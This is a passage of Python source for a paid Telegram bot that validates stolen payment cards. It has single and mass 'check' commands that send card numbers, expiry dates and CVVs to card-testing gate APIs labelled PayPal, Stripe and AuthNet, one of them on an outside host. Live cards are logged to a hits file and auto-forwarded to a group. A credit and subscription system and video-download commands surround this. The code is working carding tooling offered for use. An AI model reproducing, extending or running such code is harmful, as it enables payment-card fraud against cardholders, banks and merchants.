            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Paypal [2$]'
        }
    

# Handle both /b3 and .b3
@bot.message_handler(commands=['pp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pp'))
def handle_pp(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /py CC|MM|YYYY|CVV or .py CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Paypal [2$] </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_pp_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - pp] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def download_and_send_video(message, url, msg_id, tag):
    chat_id = message.chat.id

    try:
        send_progress_animation(bot, chat_id, msg_id)

        # Options for yt-dlp
        ydl_opts = {
            'format': 'mp4',
            'outtmpl': f"{tag}_%(title).50s.%(ext)s",
            'quiet': True,
        }

        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            filename = ydl.prepare_filename(info)

        title = info.get('title', 'Downloaded Video')

        bot.send_chat_action(chat_id, 'upload_video')
        with open(filename, 'rb') as video:
            bot.send_video(chat_id, video, caption=f"🎬 <b>{title}</b>", parse_mode='HTML')

        os.remove(filename)
        bot.delete_message(chat_id, msg_id)

    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ Error: {str(e)}")

def send_progress_animation(bot, chat_id, message_id):
    progress_stages = [
        "Downloading video, please wait.\n[░░░░░░░░░░]",
        "Downloading video, please wait.\n[▓░░░░░░░░░]",
        "Downloading video, please wait.\n[▓▓░░░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓░░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓▓░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓▓▓]"
    ]
    for stage in progress_stages:
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=stage)
            time.sleep(0.4)
        except:
            break


@bot.message_handler(commands=['yt'])
def handle_youtube_download(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DM. Use it in an approved group or subscribe to unlock.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /yt <YouTube video URL>")
        return

    link = message.text.split()[1]
    msg = bot.reply_to(message, "Downloading video, please wait.\n[░░░░░░░░░░]")
    threading.Thread(target=download_and_send_video, args=(message, link, msg.message_id, "yt")).start()

@bot.message_handler(commands=['ins'])
def handle_instagram_download(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DM. Use it in an approved group or subscribe to unlock.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /ins <Instagram video URL>")
        return

    link = message.text.split()[1]
    msg = bot.reply_to(message, "Downloading video, please wait.\n[░░░░░░░░░░]")
    threading.Thread(target=download_and_send_video, args=(message, link, msg.message_id, "ins")).start()

@bot.message_handler(commands=['broad'])
def handle_broadcast_reply(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    if not message.reply_to_message:
        bot.reply_to(message, "❌ Please reply to the message you want to broadcast.")
        return

    msg = message.reply_to_message

    # Collect targets from Firebase
    user_credits = read_firebase("user_credits") or {}
    subscribed_users = read_firebase("subscribed_users") or {}
    approved_groups = read_firebase("approved_groups") or []
    
    all_users = set(user_credits.keys()) | set(subscribed_users.keys())
    all_groups = set(approved_groups)

    targets = list(all_users) + list(all_groups)
    targets = [int(uid) for uid in targets if str(uid).lstrip("-").isdigit()]

    total = len(targets)
    success = 0
    failed = 0
    errors = 0
    start_time = time.time()

    # Initial status message
    status_text = f"""
📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭𝐢𝐧𝐠 𝐌𝐞𝐬𝐬𝐚𝐠𝐞...

✧ 𝐓𝐨𝐭𝐚𝐥: <code>{total}</code>  
✧ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: <code>{success}</code>  
✧ 𝐅𝐚𝐢𝐥𝐞𝐝: <code>{failed}</code>  
✧ 𝐄𝐫𝐫𝐨𝐫𝐬: <code>{errors}</code>  
✧ 𝐓𝐢𝐦𝐞: 0.00 S

"""
    status_msg = bot.reply_to(message, status_text, parse_mode='HTML')

    for idx, uid in enumerate(targets):
        try:
            if msg.text:
                bot.send_message(uid, msg.text, parse_mode='HTML')
            elif msg.caption and msg.photo:
                bot.send_photo(uid, msg.photo[-1].file_id, caption=msg.caption, parse_mode='HTML')
            elif msg.caption and msg.video:
                bot.send_video(uid, msg.video.file_id, caption=msg.caption, parse_mode='HTML')
            elif msg.document:
                bot.send_document(uid, msg.document.file_id, caption=msg.caption or None)
            elif msg.sticker:
                bot.send_sticker(uid, msg.sticker.file_id)
            elif msg.voice:
                bot.send_voice(uid, msg.voice.file_id)
            elif msg.audio:
                bot.send_audio(uid, msg.audio.file_id, caption=msg.caption or None)
            else:
                errors += 1
                continue
            success += 1

        except telebot.apihelper.ApiTelegramException as e:
            if "chat not found" in str(e).lower():
                print(f"❌ Chat not found: {uid}")
            else:
                print(f"❌ Failed to send to {uid}: {str(e)}")
            failed += 1

        except Exception as e:
            print(f"Error sending to {uid}: {e}")
            errors += 1

        # Update live status every 5 sends or at the end
        if (success + failed + errors) % 5 == 0 or (success + failed + errors) == total:
            elapsed = time.time() - start_time
            updated_status = f"""
📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬

✧ 𝐓𝐨𝐭𝐚𝐥 ↣ <code>{total}</code>  
✧ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 ↣ <code>{success}</code>  
✧ 𝐅𝐚𝐢𝐥𝐞𝐝 ↣ <code>{failed}</code>  
✧ 𝐄𝐫𝐫𝐨𝐫𝐬 ↣ <code>{errors}</code>  
✧ 𝐓𝐢𝐦𝐞 ↣ <code>{elapsed:.2f} S</code>

"""
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=updated_status,
                                      parse_mode='HTML')
            except:
                pass

def check_sr_api_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth 3'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"http://127.0.0.1:3456/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 3'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 3'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Auth 3'
        }


# Handle both /chk and .chk
@bot.message_handler(commands=['sr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sr'))

def handle_sr(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @SongPY To get approved")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /str CC|MM|YYYY|CVV or .chk CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[5:].strip()  # remove ".chk "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Auth 3</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_sr_api_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /mchk and .mchk
@bot.message_handler(commands=['msr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msr'))
def handle_msr(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        # Check credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sr_api_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway':'Stripe Auth 3'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


def check_sp_api_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Premium Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"http://127.0.0.1:5003/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Premium Auth'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Premium Auth'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Premium Auth'
        }


# Handle both /chk and .chk

@bot.message_handler(commands=['sp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sp'))
def handle_sp(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /sp CC|MM|YYYY|CVV or .sp CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Premium Auth</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_sp_api_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /sp] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mchk and .mchk
@bot.message_handler(commands=['msp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msp'))
def handle_mp(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        # Check credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sp_api_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway':'Stripe Premium Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_at_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'AuthNet [49$}'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"https://authnet-api.onrender.com/gate=auth/key=darkwaslost/cc={formatted_cc}",
                timeout=300
            )
